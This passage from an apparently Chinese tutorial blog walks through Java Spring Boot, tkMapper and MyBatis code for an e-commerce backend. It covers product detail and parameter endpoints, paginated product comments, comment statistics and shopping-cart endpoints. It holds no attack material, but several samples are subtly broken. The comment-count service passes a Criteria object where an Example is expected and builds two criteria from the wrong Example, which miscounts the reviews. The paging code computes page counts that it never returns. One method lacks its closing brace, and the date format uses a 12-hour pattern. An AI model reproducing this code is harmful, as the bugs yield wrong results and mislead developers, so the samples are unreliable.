    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
    criteria.andEqualTo(<span class="hljs-string">&quot;productStatus&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//状态为1表示上架商品</span>
    List&lt;Product&gt; products = productMapper.selectByExample(example);
    <span class="hljs-keyword">if</span>(products.size() &gt; <span class="hljs-number">0</span>)&#123;
        <span class="hljs-type">Example</span> <span class="hljs-variable">exampleImg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductImg.class);
        Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">imgCriteria</span> <span class="hljs-operator">=</span> exampleImg.createCriteria();
        imgCriteria.andEqualTo(<span class="hljs-string">&quot;itemId&quot;</span>,productId);
        List&lt;ProductImg&gt; productImgs = productImgMapper.selectByExample(exampleImg);

        <span class="hljs-type">Example</span> <span class="hljs-variable">exampleSku</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductSku.class);
        Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">skuCriteria</span> <span class="hljs-operator">=</span> exampleSku.createCriteria();
        skuCriteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
        List&lt;ProductSku&gt; productSkus = productSkuMapper.selectByExample(exampleSku);

        HashMap&lt;String, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        hashMap.put(<span class="hljs-string">&quot;product&quot;</span>, products.get(<span class="hljs-number">0</span>));
        hashMap.put(<span class="hljs-string">&quot;productImgs&quot;</span>, productImgs);
        hashMap.put(<span class="hljs-string">&quot;productSkus&quot;</span>, productSkus);
        <span class="hljs-keyword">return</span> ResultVO.success(hashMap);
    &#125;
    <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;查询的商品不存在&quot;</span>);
&#125;</code></pre>

<ul>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-meta">@RequestMapping(&quot;/product&quot;)</span>
<span class="hljs-meta">@Api(value = &quot;提供商品信息相关的接口&quot;,tags = &quot;商品管理&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductController</span> &#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductService productService;
    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> ProductCommontsService productCommontsService;

    <span class="hljs-meta">@ApiOperation(&quot;商品基本信息查询接口&quot;)</span>
    <span class="hljs-meta">@GetMapping(&quot;/detail-info/&#123;pid&#125;&quot;)</span>
    <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductBasicInfo</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span>&#123;
        <span class="hljs-keyword">return</span> productService.getProductBasicInfo(pid);
    &#125;

&#125;</code></pre></li>
</ul>
<p>接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713110939926.png" alt="image-20220713110939926"></p>
</li>
</ul>
<h4 id="商品参数接口"><a href="#商品参数接口" class="headerlink" title="商品参数接口"></a>商品参数接口</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713111914400.png" alt="image-20220713111914400"></p>
<p>接口所需数据可知，也为单表查询，因此dao层可以直接使用tkMapper提供的接口</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductParamsById</span><span class="hljs-params">(String productId)</span> &#123;
    <span class="hljs-comment">//1.商品基本信息</span>
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(Product.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
    criteria.andEqualTo(<span class="hljs-string">&quot;productStatus&quot;</span>,<span class="hljs-number">1</span>);<span class="hljs-comment">//状态为1表示上架商品</span>
    List&lt;Product&gt; products = productMapper.selectByExample(example);
    <span class="hljs-keyword">if</span>(products.size() &gt; <span class="hljs-number">0</span>)&#123;
        <span class="hljs-type">Example</span> <span class="hljs-variable">exampleParams</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductParams.class);
        Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria1</span> <span class="hljs-operator">=</span> exampleParams.createCriteria();
        criteria1.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>, productId);
        List&lt;ProductParams&gt; params = productParamsMapper.selectByExample(exampleParams);
        <span class="hljs-keyword">if</span>(params.size() &gt; <span class="hljs-number">0</span>)&#123;
            <span class="hljs-keyword">return</span> ResultVO.success(params.get(<span class="hljs-number">0</span>));
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;此产品为三无产品！&quot;</span>);
        &#125;
    &#125;<span class="hljs-keyword">else</span> &#123;
        <span class="hljs-keyword">return</span> ResultVO.failed(<span class="hljs-string">&quot;查询的商品不存在&quot;</span>);
    &#125;
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;商品参数信息查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/detail-params/&#123;pid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductParams</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span>&#123;
    <span class="hljs-keyword">return</span> productService.getProductParamsById(pid);
&#125;</code></pre>

<p>测试结果</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713112142962.png" alt="image-20220713112142962"></p>
</li>
</ul>
<h4 id="商品评价接口"><a href="#商品评价接口" class="headerlink" title="商品评价接口"></a>商品评价接口</h4><p>评价接口需要完成两个功能：评价列表分页展示和评价分析</p>
<ul>
<li><p>评价列表分页展示</p>
<img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713113518231.png" alt="image-20220713113518231" style="zoom:67%;">

<p>​	</p>
<p>接口所需参数如上图，可以看出需要关联用户数据，因此为多表关联查询</p>
<ul>
<li><p>sql</p>
<pre><code class="hljs mysql">select u.username,  u.nickname, u.user_img,
  c.comm_id, c.product_id, c.product_name,
  c.order_item_id, c.user_id, c.is_anonymous,
  c.comm_type, c.comm_level, c.comm_content,
  c.comm_imgs, c.sepc_name, c.reply_status,
  c.reply_content, c.reply_time, c.is_show
from product_comments c
INNER JOIN users u
ON u.user_id = c.user_id
WHERE c.product_id = 3
limit 1,5</code></pre>
</li>
<li><p>dao</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ProductCommentsVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ProductCommentsVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;order_item_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;orderItemId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_anonymous&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isAnonymous&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_type&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commType&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_level&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commLevel&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commContent&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;comm_imgs&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;commImgs&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sepc_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;sepcName&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyStatus&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_content&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyContent&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;reply_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;replyTime&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;is_show&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;isShow&quot;</span> /&gt;</span>
    
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;username&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;nickname&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;nickname&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;user_img&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;userImg&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
    
<span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;selectCommontsByProductId&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ProductCommentsVOMap&quot;</span>&gt;</span>
  select u.username,  u.nickname, u.user_img,
    c.comm_id, c.product_id, c.product_name,
    c.order_item_id, c.user_id, c.is_anonymous,
    c.comm_type, c.comm_level, c.comm_content,
    c.comm_imgs, c.sepc_name, c.reply_status,
    c.reply_content, c.reply_time, c.is_show
  from product_comments c
  INNER JOIN users u
  ON u.user_id = c.user_id
  WHERE c.product_id =#&#123;productId&#125;
  limit #&#123;start&#125;,#&#123;limit&#125;
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>serevice</p>
<p>添加实体类ProductCommentsVO</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductCommentsVO</span> &#123;

    <span class="hljs-keyword">private</span> String commId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String productName;
    <span class="hljs-keyword">private</span> String orderItemId;
    <span class="hljs-keyword">private</span> Integer isAnonymous;
    <span class="hljs-keyword">private</span> Integer commType;
    <span class="hljs-keyword">private</span> Integer commLevel;
    <span class="hljs-keyword">private</span> String commContent;
    <span class="hljs-keyword">private</span> String commImgs;
    <span class="hljs-keyword">private</span> Date sepcName;
    <span class="hljs-keyword">private</span> Integer replyStatus;
    <span class="hljs-keyword">private</span> String replyContent;
    <span class="hljs-keyword">private</span> Date replyTime;
    <span class="hljs-keyword">private</span> Integer isShow;
    <span class="hljs-comment">//封装评论对应的用户数据</span>
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String username;
    <span class="hljs-keyword">private</span> String nickname;
    <span class="hljs-keyword">private</span> String userImg;
&#125;</code></pre>

<p>添加分页实体类</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PageHelper</span>&lt;T&gt; &#123;

    <span class="hljs-comment">//总记录数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> count;

    <span class="hljs-comment">//总页数</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> pageCount;

    <span class="hljs-comment">//分页数据</span>
    <span class="hljs-keyword">private</span> List&lt;T&gt; list;

&#125;</code></pre>

<p>Service的代码</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">listCommontsByProductId</span><span class="hljs-params">(String productId,<span class="hljs-type">int</span> pageNum,<span class="hljs-type">int</span> limit)</span> &#123;
    <span class="hljs-comment">//List&lt;ProductCommentsVO&gt; productCommentsVOS = productCommentsMapper.selectCommontsByProductId(productId);</span>
    <span class="hljs-comment">//1.根据商品id查询总记录数</span>
    <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductComments.class);
    Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
    criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
    <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> productCommentsMapper.selectCountByExample(example);
    
    <span class="hljs-comment">//2.计算总页数（必须确定每页显示多少条  pageSize = limit）</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">pageCount</span> <span class="hljs-operator">=</span> count%limit==<span class="hljs-number">0</span>? count/limit : count/limit+<span class="hljs-number">1</span>;
    
    <span class="hljs-comment">//3.查询当前页的数据（因为评论中需要用户信息，因此需要连表查询---自定义）</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> (pageNum-<span class="hljs-number">1</span>)*limit;
    List&lt;ProductCommentsVO&gt; list = productCommentsMapper.selectCommontsByProductId(productId, start, limit);
    
    <span class="hljs-keyword">return</span> ResultVO.success(list);
&#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@ApiOperation(&quot;商品评价分页查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/detail-commonts/&#123;pid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductCommonts</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid,</span>
<span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;pageNum&quot;)</span> <span class="hljs-type">int</span> pageNum,</span>
<span class="hljs-params">                                   <span class="hljs-meta">@RequestParam(&quot;limit&quot;)</span> <span class="hljs-type">int</span> limit)</span>&#123;
    <span class="hljs-keyword">return</span> productCommontsService.listCommontsByProductId(pid, pageNum, limit);
&#125;</code></pre>

<p>接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713150611632.png" alt="image-20220713150611632"></p>
</li>
</ul>
</li>
<li><p>评价分析</p>
<p>对该商品的评价进行分类，分为好评中评和差评</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713112838049.png" alt="image-20220713112838049"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713113028811.png" alt="image-20220713113028811"></p>
<p>响应数据如图所示，可以看出是单表查询</p>
<ul>
<li><p>service</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
 <span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getCommentsCountByProductId</span><span class="hljs-params">(String productId)</span> &#123;
    <span class="hljs-comment">// 查询商品总数</span>
     <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductComments.class);
     Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria</span> <span class="hljs-operator">=</span> example.createCriteria();
     criteria.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> productCommentsMapper.selectCountByExample(criteria);
    
     <span class="hljs-comment">// 查询好评数</span>
     <span class="hljs-type">Example</span> <span class="hljs-variable">example1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductComments.class);
     Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria1</span> <span class="hljs-operator">=</span> example1.createCriteria();
     criteria1.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     criteria1.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, <span class="hljs-number">1</span>);
     <span class="hljs-type">int</span> <span class="hljs-variable">goodTotal</span> <span class="hljs-operator">=</span> productCommentsMapper.selectCountByExample(example1);
    
     <span class="hljs-comment">// 查询中评数</span>
     <span class="hljs-type">Example</span> <span class="hljs-variable">example2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductComments.class);
     Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria2</span> <span class="hljs-operator">=</span> example1.createCriteria();
     criteria2.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     criteria2.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, <span class="hljs-number">0</span>);
     <span class="hljs-type">int</span> <span class="hljs-variable">midTotal</span> <span class="hljs-operator">=</span> productCommentsMapper.selectCountByExample(example2);
    
     <span class="hljs-comment">// 查询差评数</span>
     <span class="hljs-type">Example</span> <span class="hljs-variable">example3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>(ProductComments.class);
     Example.<span class="hljs-type">Criteria</span> <span class="hljs-variable">criteria3</span> <span class="hljs-operator">=</span> example1.createCriteria();
     criteria3.andEqualTo(<span class="hljs-string">&quot;productId&quot;</span>,productId);
     criteria3.andEqualTo(<span class="hljs-string">&quot;commType&quot;</span>, -<span class="hljs-number">1</span>);
     <span class="hljs-type">int</span> <span class="hljs-variable">badTotal</span> <span class="hljs-operator">=</span> productCommentsMapper.selectCountByExample(example3);
    
     <span class="hljs-comment">// 好评率</span>
     <span class="hljs-type">double</span> <span class="hljs-variable">percent</span> <span class="hljs-operator">=</span> (Double.parseDouble(goodTotal+<span class="hljs-string">&quot;&quot;</span>)/Double.parseDouble(total + <span class="hljs-string">&quot;&quot;</span>)) * <span class="hljs-number">100</span>;
     <span class="hljs-type">String</span> <span class="hljs-variable">percentValue</span> <span class="hljs-operator">=</span> (percent+<span class="hljs-string">&quot;&quot;</span>).substring(<span class="hljs-number">0</span>,(percent+<span class="hljs-string">&quot;&quot;</span>).lastIndexOf(<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">3</span>);
    
     HashMap&lt;String, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
     hashMap.put(<span class="hljs-string">&quot;total&quot;</span>, total);
     hashMap.put(<span class="hljs-string">&quot;goodTotal&quot;</span>, goodTotal);
     hashMap.put(<span class="hljs-string">&quot;badTotal&quot;</span>, badTotal);
     hashMap.put(<span class="hljs-string">&quot;midTotal&quot;</span>, midTotal);
     hashMap.put(<span class="hljs-string">&quot;percent&quot;</span>, percentValue);
     
     <span class="hljs-keyword">return</span> ResultVO.success(hashMap);
    
 &#125;</code></pre>
</li>
<li><p>controller</p>
<pre><code class="hljs java">    
<span class="hljs-meta">@ApiOperation(&quot;商品总体评价信息查询接口&quot;)</span>
<span class="hljs-meta">@GetMapping(&quot;/detail-commontscount/&#123;pid&#125;&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">getProductCommontscount</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable(&quot;pid&quot;)</span> String pid)</span>&#123;
    <span class="hljs-keyword">return</span> productCommontsService.getCommentsCountByProductId(pid);
&#125;</code></pre></li>
</ul>
</li>
</ul>
<h3 id="1-9-购物车业务"><a href="#1-9-购物车业务" class="headerlink" title="1.9 购物车业务"></a>1.9 购物车业务</h3><h4 id="添加购物车"><a href="#添加购物车" class="headerlink" title="添加购物车"></a>添加购物车</h4><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220713151431751.png" alt="image-20220713151431751"></p>
<ul>
<li><p>Service</p>
<pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-type">SimpleDateFormat</span> <span class="hljs-variable">sdf</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleDateFormat</span>(<span class="hljs-string">&quot;yyyy-MM-dd hh:mm:ss&quot;</span>);    
<span class="hljs-meta">@Override</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">addShoppingCart</span><span class="hljs-params">(ShoppingCart cart)</span> &#123;
    cart.setCartTime(sdf.format(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()));
    <span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> shoppingCartMapper.insert(cart);
    <span class="hljs-keyword">if</span>(i&gt;<span class="hljs-number">0</span>)&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.OK,<span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-literal">null</span>);
    &#125;<span class="hljs-keyword">else</span>&#123;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResultVO</span>(ResStatus.NO,<span class="hljs-string">&quot;fail&quot;</span>,<span class="hljs-literal">null</span>);
    &#125;
</code></pre>
</li>
<li><p>Controller</p>
<pre><code class="hljs java"><span class="hljs-meta">@PostMapping(&quot;/add&quot;)</span>
<span class="hljs-keyword">public</span> ResultVO <span class="hljs-title function_">addShoppingCart</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> ShoppingCart cart)</span>&#123;
    <span class="hljs-type">ResultVO</span> <span class="hljs-variable">resultVO</span> <span class="hljs-operator">=</span> shoppingCartService.addShoppingCart(cart);
    <span class="hljs-keyword">return</span> resultVO;
&#125;</code></pre></li>
</ul>
<h4 id="获取购物车列表"><a href="#获取购物车列表" class="headerlink" title="获取购物车列表"></a>获取购物车列表</h4><ul>
<li><p>sql</p>
<pre><code class="hljs mysql">select c.cart_id, c.product_id,  c.sku_id, c.user_id, c.cart_num, c.cart_time,
c.product_price, c.sku_props,p.product_name, i.url,s.original_price,s.sell_price,s.sku_name
from shopping_cart c 
inner JOIN product p
INNER JOIN product_sku s
INNER JOIN product_img i
ON c.product_id = p.product_id
AND c.sku_id=s.sku_id
AND c.product_id=i.item_id
WHERE c.user_id = 1
AND i.is_main=1</code></pre>
</li>
<li><p>dao</p>
<p>创建一个新的实体类用于保存返回的数据</p>
<pre><code class="hljs java"><span class="hljs-meta">@Data</span>
<span class="hljs-meta">@NoArgsConstructor</span>
<span class="hljs-meta">@AllArgsConstructor</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShoppingCartVO</span> &#123;
    <span class="hljs-keyword">private</span> Integer cartId;
    <span class="hljs-keyword">private</span> String productId;
    <span class="hljs-keyword">private</span> String skuId;
    <span class="hljs-keyword">private</span> String userId;
    <span class="hljs-keyword">private</span> String cartNum;
    <span class="hljs-keyword">private</span> String cartTime;
    <span class="hljs-keyword">private</span> BigDecimal productPrice;
    <span class="hljs-keyword">private</span> String skuProps;

    <span class="hljs-keyword">private</span> String productName;
    <span class="hljs-keyword">private</span> String productImg;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> originalPrice;
    <span class="hljs-keyword">private</span> <span class="hljs-type">double</span> sellPrice;
    <span class="hljs-keyword">private</span> String skuName;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> skuStock;  <span class="hljs-comment">//库存</span>
&#125;</code></pre>

<p>mapper</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> List&lt;ShoppingCartVO&gt; <span class="hljs-title function_">selectShopcartByUserId</span><span class="hljs-params">(<span class="hljs-type">int</span> userId)</span>;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ShoppingCartVOMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.qfedu.fmmall.entity.ShoppingCartVO&quot;</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;cart_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;cartId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sku_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;skuId&quot;</span> /&gt;</span>
